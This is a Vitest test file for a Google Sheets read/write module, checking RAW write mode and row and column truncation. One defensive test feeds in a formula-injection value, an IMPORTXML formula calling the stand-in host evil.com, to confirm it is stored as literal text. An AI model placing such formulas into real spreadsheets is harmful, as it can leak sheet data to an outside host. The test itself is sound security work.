import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { OAuth2Client } from 'googleapis-common';

// Mock googleapis before importing the module under test
vi.mock('googleapis', () => {
  const mockUpdate = vi.fn();
  const mockGet = vi.fn();
  const mockCreate = vi.fn();

  return {
    google: {
      sheets: () => ({
        spreadsheets: {
          get: mockGet,
          create: mockCreate,
          values: {
            get: mockGet,
            update: mockUpdate,
          },
        },
      }),
    },
    __mockUpdate: mockUpdate,
    __mockGet: mockGet,
    __mockCreate: mockCreate,
  };
});

import { writeSheetRange, readSheetRange } from '../src/sheets.js';

// Access the mocks
const googleapis = await import('googleapis');
const mockUpdate = (googleapis as unknown as { __mockUpdate: ReturnType<typeof vi.fn> }).__mockUpdate;
const mockGet = (googleapis as unknown as { __mockGet: ReturnType<typeof vi.fn> }).__mockGet;

const fakeAuth = {} as OAuth2Client;
const getAuth = async () => fakeAuth;

beforeEach(() => {
  vi.clearAllMocks();
});

describe('write_sheet_range', () => {
  it('always sends valueInputOption: RAW', async () => {
    mockUpdate.mockResolvedValueOnce({
      data: {
        updatedRange: 'Sheet1!A1:B2',
        updatedRows: 2,
        updatedColumns: 2,
        updatedCells: 4,
      },
    });

    const result = await writeSheetRange(
      {
        spreadsheet_id: 'test-id',
        range: 'Sheet1!A1:B2',
        values: [['a', 'b'], ['c', 'd']],
      },
      getAuth,
    );

    expect(mockUpdate).toHaveBeenCalledOnce();
    const callArgs = mockUpdate.mock.calls[0][0];
    expect(callArgs.valueInputOption).toBe('RAW');
    expect(result.updatedCells).toBe(4);
  });

  it('sends formula strings as literal text with RAW mode', async () => {
    const formulaValue = '=IMPORTXML("http://evil.com","//data")';

    mockUpdate.mockResolvedValueOnce({
      data: {
        updatedRange: 'Sheet1!A1',
        updatedRows: 1,
        updatedColumns: 1,
        updatedCells: 1,
      },
    });

    await writeSheetRange(
      {
        spreadsheet_id: 'test-id',
        range: 'Sheet1!A1',
        values: [[formulaValue]],
      },
      getAuth,
    );

    expect(mockUpdate).toHaveBeenCalledOnce();
    const callArgs = mockUpdate.mock.calls[0][0];
    // RAW mode means the formula string is stored as literal text, not executed
    expect(callArgs.valueInputOption).toBe('RAW');
    expect(callArgs.requestBody.values).toEqual([[formulaValue]]);
  });
});

describe('read_sheet_range', () => {
  it('truncates responses exceeding 1000 rows', async () => {
    // Generate 1005 rows of data
    const largeData = Array.from({ length: 1005 }, (_, i) => [`row${i}`, `val${i}`]);

    mockGet.mockResolvedValueOnce({
      data: {
        range: 'Sheet1!A1:B1005',
        values: largeData,
      },
    });

    const result = await readSheetRange(
      {
        spreadsheet_id: 'test-id',
        range: 'Sheet1!A1:B1005',
      },
      getAuth,
    );

    expect(result.values.length).toBe(1000);
    expect(result.truncated).toBe(true);
  });

  it('truncates columns exceeding 50', async () => {
    // Generate 1 row with 55 columns
    const wideRow = Array.from({ length: 55 }, (_, i) => `col${i}`);

    mockGet.mockResolvedValueOnce({
      data: {
        range: 'Sheet1!A1:BC1',
        values: [wideRow],
      },
    });

    const result = await readSheetRange(
      {
        spreadsheet_id: 'test-id',
        range: 'Sheet1!A1:BC1',
      },
      getAuth,
    );

    expect(result.values[0].length).toBe(50);
    expect(result.truncated).toBe(true);
  });

  it('does not set truncated when within limits', async () => {
    mockGet.mockResolvedValueOnce({
      data: {
        range: 'Sheet1!A1:B3',
        values: [['a', 'b'], ['c', 'd'], ['e', 'f']],
      },
    });

    const result = await readSheetRange(
      {
        spreadsheet_id: 'test-id',
        range: 'Sheet1!A1:B3',
      },
      getAuth,
    );

    expect(result.values.length).toBe(3);
    expect(result.truncated).toBeUndefined();
  });
});
